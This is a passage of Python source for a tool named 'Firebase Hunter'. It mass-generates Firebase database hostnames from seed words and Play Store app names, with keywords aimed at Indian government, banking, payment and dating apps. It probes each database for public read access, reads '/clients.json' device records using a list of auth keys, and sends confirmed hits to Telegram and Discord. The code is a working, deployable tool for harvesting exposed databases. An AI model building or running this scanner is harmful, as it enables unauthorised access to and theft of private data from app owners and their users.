        log(f"generate_random_batch error: {e}")
        return 0


# ═══════════════════════════════════════════════════════════════
#  SEED EXPANSION — real patterns only
# ═══════════════════════════════════════════════════════════════
def sanitize_seed(s):
    s = (s or "").strip().lower()
    s = re.sub(r"[^a-z0-9\-_]", "", s)
    return s[:60]


def extract_project(url: str) -> str:
    try:
        host = (urlparse(url).hostname or "").lower()
    except Exception:
        return ""
    return host_to_project(host) or ""


def _seed_variants(seed: str) -> list:
    out = set()
    seed = re.sub(r"-{2,}", "-", seed).strip("-").lower()
    base = _strip_auto_suffix(seed)
    if not base or len(base) < 3:
        return []

    for mod in SECOND_PROJECT_MODS:
        for cand in (f"{base}-{mod}", f"{mod}-{base}"):
            v = _validate(cand)
            if v: out.add(v)

    for n in range(1, 11):
        for cand in (f"{base}-{n}", f"{base}{n}"):
            v = _validate(cand)
            if v: out.add(v)

    for y in ("2022", "2023", "2024", "2025", "2026"):
        v = _validate(f"{base}-{y}")
        if v: out.add(v)

    for _ in range(3):
        v = _validate(f"{base}-{_hex5()}")
        if v: out.add(v)

    if validate_project_id(base):
        out.add(base)

    return list(out)


def generate_auto_batch(job_id, seeds, batch_size):
    try:
        c = db()
        existing = {r["url"] for r in c.execute(
            "SELECT url FROM items WHERE job_id=?", (job_id,)).fetchall()}
        active_projects = []
        if AUTO_EXPAND:
            for r in c.execute(
                "SELECT url FROM items WHERE job_id=? AND status='active' LIMIT 500",
                (job_id,)).fetchall():
                p = extract_project(r["url"])
                if p and p not in active_projects:
                    active_projects.append(p)
        c.close()

        pool = list(seeds) + active_projects
        if not pool:
            return 0
        weighted = list(seeds) + active_projects * 3

        new_items, attempts = [], 0
        max_attempts = batch_size * 20
        while len(new_items) < batch_size and attempts < max_attempts:
            attempts += 1
            base = random.choice(weighted)
            variants = _seed_variants(base)
            random.shuffle(variants)
            for m in variants:
                url = build_firebase_url(m)
                if not url or url in existing:
                    continue
                existing.add(url)
                new_items.append((job_id, url))
                if len(new_items) >= batch_size:
                    break
            if len(new_items) >= batch_size:
                break

        if new_items:
            c = db()
            c.executemany("INSERT INTO items(job_id,url) VALUES(?,?)", new_items)
            c.execute("UPDATE jobs SET total=total+?, updated_at=? WHERE id=?",
                      (len(new_items), now(), job_id))
            c.close()
        return len(new_items)
    except Exception as e:
        log(f"generate_auto_batch error: {e}")
        return 0


# ═══════════════════════════════════════════════════════════════
#  PROBE — legacy only, efficient
# ═══════════════════════════════════════════════════════════════
def _get_conn(host, port):
    cache = getattr(_TLS, "conn", None)
    if cache and cache[0] == (host, port):
        return cache[1]
    if cache:
        try: cache[1].close()
        except Exception: pass
    conn = http.client.HTTPSConnection(host, port, timeout=TIMEOUT)
    _TLS.conn = ((host, port), conn)
    return conn


def probe(url):
    """
    GET {url}/.json?orderBy="$key"&limitToFirst=1
    - 200 + non-null JSON  -> active
    - 200 + null/empty     -> invalid_no_data
    - 401/403              -> inactive (rules locked)
    - other                -> inactive
    - >64KB body           -> active (public read confirmed)
    """
    started = time.monotonic()
    try:
        u = urlparse(url)
        host, port = u.hostname, u.port or 443
        base = u.path or "/"
        if not base.endswith(".json"):
            base = base.rstrip("/") + "/.json" if base != "/" else "/.json"
        q = [(k, v) for k, v in parse_qsl(u.query, keep_blank_values=True)
             if k.lower() not in {"orderby", "limittofirst"}]
        q += [("orderBy", '"$key"'), ("limitToFirst", "1")]
        path = base + "?" + urlencode(q)

        def _do():
            conn = _get_conn(host, port)
            conn.request("GET", path,
                         headers={"Accept": "application/json",
                                  "User-Agent": "FB-Checker/7.0"})
            return conn.getresponse()

        try:
            resp = _do()
        except (http.client.HTTPException, ConnectionError, OSError):
            _TLS.conn = None
            resp = _do()

        code = resp.status
        latency = int((time.monotonic() - started) * 1000)
        if code != 200:
            resp.read(16 * 1024)
            return "inactive", code, f"HTTP {code}", latency

        chunks, total = [], 0
        while total <= MAX_PROBE:
            chunk = resp.read(min(8192, MAX_PROBE + 1 - total))
            if not chunk:
                break
            chunks.append(chunk)
            total += len(chunk)
            if total > MAX_PROBE:
                return "active", code, "HTTP 200 + large body", latency

        body = b"".join(chunks)
        if not body.strip():
            return "invalid_no_data", code, "Empty response", latency
        try:
            parsed = json.loads(body.decode("utf-8", "strict"))
        except Exception:
            return "invalid_no_data", code, "Invalid JSON", latency
        if parsed in (None, "", {}, [], False, 0):
            return "invalid_no_data", code, "No data", latency
        return "active", code, "HTTP 200 + data", latency
    except Exception as e:
        return ("unreachable", None, f"{type(e).__name__}: {str(e)[:150]}",
                int((time.monotonic() - started) * 1000))


# ═══════════════════════════════════════════════════════════════
#  VERIFY DEVICES
# ═══════════════════════════════════════════════════════════════
def verify_devices(url, timeout=VERIFY_TIMEOUT):
    if not VERIFY_DEVICES:
        return -1
    best = -1
    for key in VERIFY_KEYS:
        endpoint = f"{url.rstrip('/')}/clients.json"
        params = {"auth": key} if key else {}
        try:
            r = requests.get(endpoint, params=params,
                headers={"Accept": "application/json",
                         "User-Agent": "FB-Checker/7.0"},
                timeout=timeout)
            if r.status_code in (401, 403, 404):
                continue
            r.raise_for_status()
            try:
                data = r.json()
            except ValueError:
                continue
            if data is None:
                best = max(best, 0)
                continue
            if isinstance(data, dict):
                best = max(best, len(data))
                if len(data) > 0:
                    return len(data)
        except Exception:
            continue
    return best


# ═══════════════════════════════════════════════════════════════
#  NOTIFICATIONS
# ═══════════════════════════════════════════════════════════════
def _tg_send(text, reply_markup=None):
    if not TELEGRAM_ENABLED: return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text,
                   "parse_mode": "HTML", "disable_web_page_preview": True}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        req = Request(url, data=json.dumps(payload).encode(),
                      headers={"Content-Type": "application/json"})
        with urlopen(req, timeout=8) as r:
            r.read()
    except Exception as e:
        log(f"TG error: {type(e).__name__}: {str(e)[:100]}")


def tg_notify(text, reply_markup=None):
    if not TELEGRAM_ENABLED: return
    threading.Thread(target=_tg_send, args=(text, reply_markup),
                     daemon=True).start()


def _dc_send(content=None, embeds=None):
    if not DISCORD_ENABLED: return
    try:
        payload = {}
        if content:
            payload["content"] = content[:1900]
        if embeds:
            payload["embeds"] = embeds[:10]
        req = Request(DISCORD_WEBHOOK, data=json.dumps(payload).encode(),
                      headers={"Content-Type": "application/json"})
        with urlopen(req, timeout=8) as r:
            r.read()
    except Exception as e:
        log(f"Discord error: {type(e).__name__}: {str(e)[:100]}")


def dc_notify(text, embeds=None):
    if not DISCORD_ENABLED: return
    threading.Thread(target=_dc_send, args=(text, embeds), daemon=True).start()


def tg_send_document(filepath, caption=""):
    if not TELEGRAM_ENABLED: return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filepath, "rb") as f:
            files = {"document": (os.path.basename(filepath), f, "text/plain")}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption,
                    "parse_mode": "HTML"}
            requests.post(url, files=files, data=data, timeout=60)
    except Exception as e:
        log(f"TG file error: {type(e).__name__}: {str(e)[:100]}")


def tg_keyboard():
    if not PUBLIC_BASE_URL: return None
    return {"inline_keyboard": [
        [{"text": "✅ Verified URLs (.txt)",
          "url": PUBLIC_BASE_URL + "/api/public-bulk/verified.txt"}],
        [{"text": "📊 Stats",
          "url": PUBLIC_BASE_URL + "/api/public-bulk/stats"}],
    ]}


def tg_notify_verified_count(reason="Updated"):
    if not TELEGRAM_ENABLED: return
    with VERIFIED_LOCK: v = len(VERIFIED_URLS)
    msg = (f"📦 <b>{reason}</b>\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"✅ Verified (with devices): <b>{v}</b>\n"
           f"🕐 {now()}")
    tg_notify(msg, tg_keyboard())
    if DISCORD_ENABLED:
        dc_notify("", embeds=[{
            "title": f"📦 {reason}", "color": 0x10b981,
            "fields": [{"name": "Verified", "value": str(v), "inline": True}],
            "timestamp": now()
        }])


def tg_notify_verified_new(url, http_code, latency_ms, device_count):
    if TELEGRAM_ENABLED:
        msg = (
            f"🔥 <b>VERIFIED FIREBASE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>{url}</code>\n\n"
            f"<b>Devices:</b> {device_count} ✅\n"
            f"<b>HTTP:</b> {http_code}\n"
            f"<b>Latency:</b> {latency_ms if latency_ms is not None else '—'} ms\n"
            f'🔗 <a href="{url}/.json?shallow=true">Open JSON</a>'
        )
        tg_notify(msg)
    if DISCORD_ENABLED:
        dc_notify("", embeds=[{
            "title": "🔥 VERIFIED FIREBASE",
            "description": f"```\n{url}\n```",
            "color": 0x10b981,
            "fields": [
                {"name": "Devices", "value": str(device_count), "inline": True},
                {"name": "HTTP", "value": str(http_code), "inline": True},
                {"name": "Latency", "value": f"{latency_ms or '—'} ms", "inline": True},
            ],
            "url": f"{url}/.json?shallow=true",
            "timestamp": now()
        }])


def tg_startup_msg():
    if not TELEGRAM_ENABLED: return
    with VERIFIED_LOCK: v = len(VERIFIED_URLS)
    with ACTIVE_LOCK: a = len(ACTIVE_URLS)
    seeds = _load_seed_bases()
    msg = (f"🚀 <b>Firebase Hunter v7.0</b>\n"
           f"Workers: {WORKERS} | Timeout: {TIMEOUT}s\n"
           f"URL: legacy .firebaseio.com only\n"
           f"Seeds: {len(seeds)} | Play: {len(PLAY_NAMES)}\n"
           f"Loaded: ✅ {v} verified · 📁 {a} active")
    tg_notify(msg, tg_keyboard())


# ═══════════════════════════════════════════════════════════════
#  PERIODIC FILE SENDER
# ═══════════════════════════════════════════════════════════════
def periodic_file_sender():
    log(f"📤 File sender started (every {FILE_INTERVAL // 60} min)")
    next_send = time.time() + FILE_INTERVAL
    while not STOP.is_set():
        wait = next_send - time.time()
        if wait > 0:
            if STOP.wait(min(wait, 5)):
                return
            continue
        try:
            save_all_files()
            if TELEGRAM_ENABLED:
                with VERIFIED_LOCK: v = len(VERIFIED_URLS)
                if v > 0 and VERIFIED_FILE.exists():
                    tg_send_document(str(VERIFIED_FILE),
                        f"✅ <b>Verified URLs</b>\nTotal: <b>{v}</b>\n{now()}")
                    log(f"📤 Sent valid.txt ({v} verified)")
        except Exception as e:
            log(f"periodic_file_sender error: {e}")
        next_send = time.time() + FILE_INTERVAL


# ═══════════════════════════════════════════════════════════════
#  URL PARSING
# ═══════════════════════════════════════════════════════════════
def normalize(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    candidate = line.split(",", 1)[0].strip().strip('"').strip("'")
    if candidate.lower() in ("url", "firebase_url", "firebase url"):
        return None
    return canonical_url(candidate)


def parse_urls(content):
    seen, out = set(), []
    for line in content.splitlines():
        u = normalize(line)
        if u and u not in seen:
            seen.add(u)
            out.append(u)
            if len(out) >= MAX_URLS:
                break
    return out


# ═══════════════════════════════════════════════════════════════
#  JOB CLAIM / RESULT
# ═══════════════════════════════════════════════════════════════
def claim_job():
    c = db()
    try:
        c.execute("BEGIN IMMEDIATE")
        row = c.execute("SELECT id FROM jobs WHERE status='pending' "
                        "ORDER BY id LIMIT 1").fetchone()
        if not row:
            c.execute("ROLLBACK")
            return None
        c.execute("UPDATE jobs SET status='processing', "
                  "started_at=COALESCE(started_at,?), updated_at=? "
                  "WHERE id=? AND status='pending'",
                  (now(), now(), row["id"]))
        if c.total_changes != 1:
            c.execute("ROLLBACK")
            return None
        c.execute("COMMIT")
        return row["id"]
    finally:
        c.close()


def claim_item(job_id):
    c = db()
    try:
        c.execute("BEGIN IMMEDIATE")
        row = c.execute("SELECT * FROM items WHERE job_id=? AND status='pending' "
                        "ORDER BY id LIMIT 1", (job_id,)).fetchone()
        if not row:
            c.execute("ROLLBACK")
            return None
        c.execute("UPDATE items SET status='checking' WHERE id=? AND status='pending'",
                  (row["id"],))
        if c.total_changes != 1:
            c.execute("ROLLBACK")
            return None
        c.execute("COMMIT")
        return row
    finally:
        c.close()


def save_result(item, result):
    status, code, detail, latency = result
    c = db()
    try:
        c.execute("BEGIN")
        c.execute("UPDATE items SET status=?,http_status=?,error=?,latency_ms=?,"
                  "checked_at=? WHERE id=?",
                  (status, code, detail, latency, now(), item["id"]))
        col = {"active": "active", "inactive": "inactive",
               "invalid_no_data": "no_data", "unreachable": "unreachable",
               "response_too_large": "too_large"}.get(status)
        if col:
            c.execute(f"UPDATE jobs SET processed=processed+1,{col}={col}+1,"
                      f"updated_at=? WHERE id=?", (now(), item["job_id"]))
        c.execute("COMMIT")
    except Exception as e:
        log(f"save_result error: {e}")
    finally:
        c.close()

    project = extract_project(item["url"])
    if project:
        record_seed_attempt(project, status == "active")

    if status == "active":
        is_new_active = persist_active(item["url"], item["job_id"],
                                       code or 200, latency)
        device_count = verify_devices(item["url"])
        if device_count > 0:
            is_new_verified = persist_verified(item["url"], item["job_id"],
                                               device_count, code or 200, latency)
            if is_new_verified:
                log(f"✅ VERIFIED #{item['job_id']} | {item['url']} "
                    f"| devices={device_count}")
                tg_notify_verified_new(item["url"], code or 200,
                                       latency, device_count)
                tg_notify_verified_count("✅ New verified URL")
        if is_new_active:
            log(f"🎯 ACTIVE #{item['job_id']} | {item['url']} "
                f"| devices={device_count}")
        else:
            log(f"⚡ ACTIVE (dup) | {item['url']} | devices={device_count}")
    else:
        log(f"JOB #{item['job_id']} → {status.upper()} | {item['url']} "
            f"| HTTP {code or '-'}")


def finish_if_done(job_id):
    c = db()
    try:
        pending = c.execute(
            "SELECT COUNT(*) n FROM items WHERE job_id=? "
            "AND status IN ('pending','checking')", (job_id,)).fetchone()["n"]
        if pending == 0:
            c.execute("UPDATE jobs SET status='completed',completed_at=?,"
                      "updated_at=? WHERE id=? AND status='processing'",
                      (now(), now(), job_id))
            return True
        return False
    finally:
        c.close()


def find_running_auto_job():
    c = db()
    row = c.execute("SELECT id FROM jobs WHERE status='processing' AND "
                    "job_type IN ('auto','auto-random') ORDER BY id LIMIT 1"
                    ).fetchone()
    c.close()
    return row["id"] if row else None


# ═══════════════════════════════════════════════════════════════
#  WORKERS
# ═══════════════════════════════════════════════════════════════
def process_manual_job(job_id):
    log(f"▶ JOB #{job_id} STARTED (manual)")
    while not STOP.is_set():
        item = claim_item(job_id)
        if not item:
            if finish_if_done(job_id):
                log(f"✔ JOB #{job_id} COMPLETED")
                save_all_files()
                with VERIFIED_LOCK: v = len(VERIFIED_URLS)
                tg_notify_verified_count(f"✔ Job #{job_id} done · {v} verified")
                return
            time.sleep(.05)
            continue
        save_result(item, probe(item["url"]))


def process_auto_tick(job_id):
    item = claim_item(job_id)
    if item:
        save_result(item, probe(item["url"]))
        return True

    with GEN_LOCK:
        c = db()
        pending = c.execute("SELECT COUNT(*) n FROM items "
                            "WHERE job_id=? AND status='pending'",
                            (job_id,)).fetchone()["n"]
        job = c.execute("SELECT seeds,total,status,job_type FROM jobs WHERE id=?",
                        (job_id,)).fetchone()
        c.close()

        if not job or job["status"] != "processing":
            return False
        if pending > 0:
            return True
        if job["total"] >= AUTO_MAX_URLS:
            c = db()
            c.execute("UPDATE jobs SET status='completed',completed_at=?,"
                      "updated_at=? WHERE id=?", (now(), now(), job_id))
            c.close()
            log(f"AUTO #{job_id} CAP REACHED")
            return False

        jt = job["job_type"] or "auto"

        if jt == "auto-random":
            n = generate_random_batch(job_id, AUTO_BATCH)
            return n > 0

        try:
            seeds = json.loads(job["seeds"] or "[]")
        except Exception:
            seeds = []
        if not seeds:
            seeds = _load_seed_bases()
        if not seeds:
            c = db()
            c.execute("UPDATE jobs SET status='completed',completed_at=?,"
                      "updated_at=? WHERE id=?", (now(), now(), job_id))
            c.close()
            return False

        n = generate_auto_batch(job_id, seeds, AUTO_BATCH)
        return n > 0


def worker(n):
    log(f"⚡ worker #{n} ready")
    while not STOP.is_set():
        jid = claim_job()
        if jid:
            c = db()
            j = c.execute("SELECT job_type FROM jobs WHERE id=?", (jid,)).fetchone()
            c.close()
            jt = j["job_type"] if j else "manual"
            if jt in ("auto", "auto-random"):
                process_auto_tick(jid)
                continue
            try:
                process_manual_job(jid)
            except Exception as e:
                log(f"JOB #{jid} FAILED: {type(e).__name__}: {e}")
                c = db()
                c.execute("UPDATE jobs SET status='failed',error=?,updated_at=? "
                          "WHERE id=?", (str(e)[:500], now(), jid))
                c.close()
            continue

        auto_jid = find_running_auto_job()
        if auto_jid:
            if not process_auto_tick(auto_jid):
                time.sleep(0.3)
            continue
        time.sleep(0.3)


# ═══════════════════════════════════════════════════════════════
#  DB READS
# ═══════════════════════════════════════════════════════════════
def get_job(token, include_items=True):
    c = db()
    job = c.execute("SELECT * FROM jobs WHERE token=?", (token,)).fetchone()
    if not job:
        c.close()
        return None
    data = dict(job)
    data["elapsed_seconds"] = elapsed_seconds(job["started_at"], job["completed_at"])
    if include_items:
        rows = c.execute("SELECT url,status,http_status,error,latency_ms,checked_at "
                         "FROM items WHERE job_id=? ORDER BY id",
                         (job["id"],)).fetchall()
        data["items"] = [dict(r) for r in rows]
    c.close()
    return data


def recent_jobs():
    c = db()
    rows = c.execute(
        "SELECT id,token,filename,total,processed,active,inactive,no_data,"
        "unreachable,too_large,status,job_type,created_at,started_at,"
        "completed_at,updated_at FROM jobs ORDER BY id DESC LIMIT 50").fetchall()
    c.close()
    out = []
    for r in rows:
        d = dict(r)
        d["elapsed_seconds"] = elapsed_seconds(r["started_at"], r["completed_at"])
        out.append(d)
    return out


def global_stats():
    c = db()
    jobs = c.execute("SELECT COUNT(*) n FROM jobs").fetchone()["n"]
    items = c.execute(
        "SELECT COUNT(*) total, "
        "SUM(CASE WHEN status='active' THEN 1 ELSE 0 END) active, "
        "SUM(CASE WHEN status='inactive' THEN 1 ELSE 0 END) inactive, "
        "SUM(CASE WHEN status='invalid_no_data' THEN 1 ELSE 0 END) no_data, "
        "SUM(CASE WHEN status='unreachable' THEN 1 ELSE 0 END) unreachable "
        "FROM items").fetchone()
    c.close()
    total = items["total"] or 0
    active = items["active"] or 0
    with ACTIVE_LOCK: a_saved = len(ACTIVE_URLS)
    with VERIFIED_LOCK: v_saved = len(VERIFIED_URLS)
    return {
        "jobs": jobs, "urls_checked": total,
        "active_found": active,
        "inactive_found": items["inactive"] or 0,
        "no_data_found": items["no_data"] or 0,
        "unreachable_found": items["unreachable"] or 0,
        "hit_rate_pct": round(active / total * 100, 2) if total else 0,
        "saved_active": a_saved,
        "saved_verified": v_saved,
        "playstore_names": len(PLAY_NAMES),
        "seed_bases": len(_load_seed_bases()),
    }


# ═══════════════════════════════════════════════════════════════
#  HTTP HANDLER
# ═══════════════════════════════════════════════════════════════
class Handler(BaseHTTPRequestHandler):
    server_version = "FBHunter/7.0"

    def log_message(self, fmt, *args):
        pass

    def _json(self, obj, status=200):
        raw = json.dumps(obj, ensure_ascii=False).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(raw)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(raw)

    def _text(self, body, filename, mime="text/plain"):
        self.send_response(200)
        self.send_header("Content-Type", f"{mime}; charset=utf-8")
        self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path

        if path in ("/", "/index.html"):
            fp = BASE / "static" / "index.html"
            if not fp.exists():
                return self._json({"ok": False, "error": "index.html missing"}, 404)
            data = fp.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        if path == "/health":
            return self._json({
                "ok": True, "service": "firebase-hunter", "version": "7.0",
                "workers": WORKERS, "auto_max_urls": AUTO_MAX_URLS,
                "auto_batch": AUTO_BATCH, "max_urls": MAX_URLS,
                "telegram": TELEGRAM_ENABLED, "discord": DISCORD_ENABLED,
                "active_count": len(ACTIVE_URLS),
                "verified_count": len(VERIFIED_URLS),
                "playstore_names": len(PLAY_NAMES),
                "seed_bases": len(_load_seed_bases()),
                "legacy_only": True, "sector_aware": True,
            })

        if path == "/api/public-bulk/stats":
            return self._json({"ok": True, "stats": global_stats()})

        if path == "/api/public-bulk/jobs":
            return self._json({"ok": True, "jobs": recent_jobs()})

        if path == "/api/public-bulk/patterns":
            return self._json({"ok": True, "top_seeds": get_top_seeds(50)})

        if path == "/api/public-bulk/seeds":
            seeds = _load_seed_bases()
            return self._json({"ok": True, "count": len(seeds),
                               "seeds": seeds[:500]})

        if path == "/api/public-bulk/active":
            with ACTIVE_LOCK: urls = sorted(ACTIVE_URLS)
            return self._json({"ok": True, "count": len(urls), "urls": urls})

        if path == "/api/public-bulk/active.txt":
            with ACTIVE_LOCK: urls = sorted(ACTIVE_URLS)
            body = "".join(u + "\n" for u in urls).encode("utf-8")
            self._text(body, "active-urls.txt")
            return

        if path == "/api/public-bulk/verified":
            with VERIFIED_LOCK: urls = sorted(VERIFIED_URLS)
            return self._json({"ok": True, "count": len(urls), "urls": urls})

        if path == "/api/public-bulk/verified.txt":
            with VERIFIED_LOCK: urls = sorted(VERIFIED_URLS)
            body = "".join(u + "\n" for u in urls).encode("utf-8")
            self._text(body, "verified-urls.txt")
            return

        if path == "/api/public-bulk/verified.json":
            c = db()
            rows = c.execute("SELECT * FROM verified_urls ORDER BY id DESC"
                             ).fetchall()
            c.close()
            return self._json({"ok": True, "count": len(rows),
                               "urls": [dict(r) for r in rows]})

        if path == "/api/public-bulk/verified.csv":
            c = db()
            rows = c.execute(
                "SELECT url,device_count,http_status,latency_ms,first_seen_at,"
                "source_job_id FROM verified_urls ORDER BY id DESC").fetchall()
            c.close()
            header = ("url,device_count,http_status,latency_ms,"
                      "first_seen_at,source_job_id\n")
            lines = [header]
            for r in rows:
                lines.append(",".join(
                    f'"{v}"' if v is not None else ""
                    for v in (r["url"], r["device_count"], r["http_status"],
                              r["latency_ms"], r["first_seen_at"],
                              r["source_job_id"])) + "\n")
            self._text("".join(lines).encode("utf-8"),
                       "verified-urls.csv", "text/csv")
            return

        if path.startswith("/api/public-bulk/jobs/"):
            tail = path[len("/api/public-bulk/jobs/"):].strip("/")
            token = tail.split("/", 1)[0] if "/" in tail else tail
            job = get_job(token)
            if not job:
                return self._json({"ok": False, "error": "Job not found"}, 404)
            return self._json({"ok": True, "job": job, "items": job["items"]})

        self._json({"ok": False, "error": "Not found"}, 404)

    def _rate_ok(self, ip):
        with RATE_LOCK:
            ts = [x for x in RATE.get(ip, []) if time.time() - x < RATE_WINDOW]
            if len(ts) >= RATE_LIMIT:
                return False
            ts.append(time.time())
            RATE[ip] = ts
            return True

    def _read_json(self, max_size):
        length = int(self.headers.get("Content-Length", "0"))
        if length <= 0 or length > max_size:
            return None
        return json.loads(self.rfile.read(length).decode("utf-8"))

    def do_POST(self):
        path = urlparse(self.path).path
        ip = self.client_address[0]

        if path.startswith("/api/public-bulk/jobs/") and path.endswith("/stop"):
            parts = path.strip("/").split("/")
            if len(parts) != 5:
                return self._json({"ok": False, "error": "Bad path"}, 400)
            token = parts[3]
            c = db()
            cur = c.execute(
                "UPDATE jobs SET status='stopped',completed_at=?,updated_at=? "
                "WHERE token=? AND status IN ('processing','pending')",
                (now(), now(), token))
            changed = cur.rowcount
            c.close()
            if not changed:
                return self._json({"ok": False, "error": "Job not running"}, 404)
            save_all_files()
            log(f"⏹ JOB {token[:8]} STOPPED")
            return self._json({"ok": True})

        if path == "/api/public-bulk/auto-random":
            if not self._rate_ok(ip):
                return self._json({"ok": False, "error": "Rate limit"}, 429)
            try:
                body = self._read_json(50000)
                if body is None:
                    body = {}
            except Exception:
                body = {}

            filename = str(body.get("filename") or
                           f"random-{int(time.time())}")[:180]
            token = secrets.token_urlsafe(24)
            c = db()
            cur = c.execute(
                "INSERT INTO jobs(token,filename,total,status,job_type,seeds) "
                "VALUES(?,?,?,'pending','auto-random',?)",
                (token, filename, 0, json.dumps([])))
            jid = cur.lastrowid
            c.close()
            log(f"🎲 AUTO-RANDOM #{jid} CREATED | {filename}")
            if TELEGRAM_ENABLED:
                tg_notify(f"🎲 <b>Auto Random started</b>\n"
                          f"Job #{jid}\n"
                          f"Legacy URL only\n"
                          f"Cap: {AUTO_MAX_URLS:,}")
            return self._json({
                "ok": True, "job_id": jid, "token": token,
                "mode": "random", "max_urls": AUTO_MAX_URLS,
            }, 201)

        if path == "/api/public-bulk/auto":
            if not self._rate_ok(ip):
                return self._json({"ok": False, "error": "Rate limit"}, 429)
            try:
                body = self._read_json(50000)
                if body is None:
                    return self._json({"ok": False, "error": "Bad size"}, 413)
            except Exception:
                return self._json({"ok": False, "error": "Invalid JSON"}, 400)

            seeds_raw = str(body.get("seeds", "") or "")
            seeds, seen = [], set()
            for raw in seeds_raw.split(","):
                s = sanitize_seed(raw)
                if s and s not in seen:
                    seen.add(s)
                    seeds.append(s)
                if len(seeds) >= 500:
                    break
            if not seeds:
                seeds = _load_seed_bases()
            if not seeds:
                return self._json({"ok": False, "error": "No seeds available"}, 400)

            filename = str(body.get("filename") or "auto-mutator")[:180]
            token = secrets.token_urlsafe(24)
            c = db()
            cur = c.execute(
                "INSERT INTO jobs(token,filename,total,status,job_type,seeds) "
                "VALUES(?,?,?,'pending','auto',?)",
                (token, filename, 0, json.dumps(seeds)))
            jid = cur.lastrowid
            c.close()
            log(f"♻ AUTO #{jid} CREATED | {len(seeds)} seeds")
            if TELEGRAM_ENABLED:
                tg_notify(f"♻️ <b>Auto started</b>\nJob #{jid}\n"
                          f"Seeds: {len(seeds)}\nCap: {AUTO_MAX_URLS:,}")
            return self._json({
                "ok": True, "job_id": jid, "token": token,
                "seeds": len(seeds), "max_urls": AUTO_MAX_URLS,
            }, 201)

        if path != "/api/public-bulk/jobs":
            return self._json({"ok": False, "error": "Not found"}, 404)

        if not self._rate_ok(ip):
            return self._json({"ok": False, "error": "Rate limit"}, 429)
        try:
            body = self._read_json(MAX_BYTES + 20000)
            if body is None:
                return self._json({"ok": False, "error": "Too large"}, 413)
        except Exception:
            return self._json({"ok": False, "error": "Invalid JSON"}, 400)

        content = str(body.get("content", "") or "")
        if len(content.encode()) > MAX_BYTES:
            return self._json({"ok": False,
                               "error": f"Exceeds {MAX_BYTES//1024//1024}MB"}, 413)
        urls = parse_urls(content)
        if not urls:
            return self._json({"ok": False, "error": "No valid legacy URLs"}, 400)

        filename = str(body.get("filename") or "firebase-urls.txt")[:180]
        token = secrets.token_urlsafe(24)
        c = db()
        cur = c.execute(
            "INSERT INTO jobs(token,filename,total,status,job_type) "
            "VALUES(?,?,?,'pending','manual')",
            (token, filename, len(urls)))
        jid = cur.lastrowid
        c.executemany("INSERT INTO items(job_id,url) VALUES(?,?)",
                      [(jid, u) for u in urls])
        c.close()
        log(f"📥 JOB #{jid} CREATED | {len(urls)} URLs")
        if TELEGRAM_ENABLED:
            tg_notify(f"📥 <b>Bulk started</b>\nJob #{jid}\nURLs: {len(urls)}")
        return self._json({
            "ok": True, "job_id": jid, "token": token, "total": len(urls)
        }, 201)


# ═══════════════════════════════════════════════════════════════
#  PLAY STORE HARVESTER
# ═══════════════════════════════════════════════════════════════
PS_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]

PS_CATEGORIES = [
    "APPLICATION", "GAME", "TOOLS", "COMMUNICATION", "SOCIAL",
    "SHOPPING", "FINANCE", "PRODUCTIVITY", "ENTERTAINMENT", "EDUCATION",
    "HEALTH_AND_FITNESS", "TRAVEL_AND_LOCAL", "FOOD_AND_DRINK",
    "PHOTOGRAPHY", "MUSIC_AND_AUDIO", "VIDEO_PLAYERS",
    "NEWS_AND_MAGAZINES", "BOOKS_AND_REFERENCE", "BUSINESS",
    "MAPS_AND_NAVIGATION", "SPORTS", "LIFESTYLE", "PERSONALIZATION",
    "MEDICAL", "ART_AND_DESIGN",
]

PS_KEYWORDS = [
    "admin", "panel", "dashboard", "portal", "backend", "manager",
    "office", "official", "service", "department", "ministry",
    "pmkisan", "kisan", "rto", "upi", "aadhaar", "pan", "ration",
    "mgnrega", "pmay", "ayushman", "jan-dhan", "mudra", "scholarship",
    "pension", "sbi", "hdfc", "icici", "axis", "kotak", "pnb",
    "paytm", "phonepe", "gpay", "bhim",
    "hospital", "clinic", "doctor", "pharmacy", "school", "college",
    "coaching", "exam", "result", "panchayat", "police", "court",
    "collector", "railway", "irctc", "transport", "bijli",
    "app", "shop", "store", "chat", "game", "wallet", "pay", "loan",
    "bill", "recharge", "travel", "hotel", "bus", "cab", "taxi",
    "dating", "matrimony", "shadi", "love", "friend",
    "news", "music", "video", "photo", "camera", "editor", "fitness",
    "yoga", "diet", "recipe", "food", "delivery",
    "stock", "crypto", "trading", "mutual fund", "insurance", "invest",
    "hindi", "tamil", "telugu", "marathi", "bengali", "gujarati",
    "kannada", "punjabi", "malayalam",
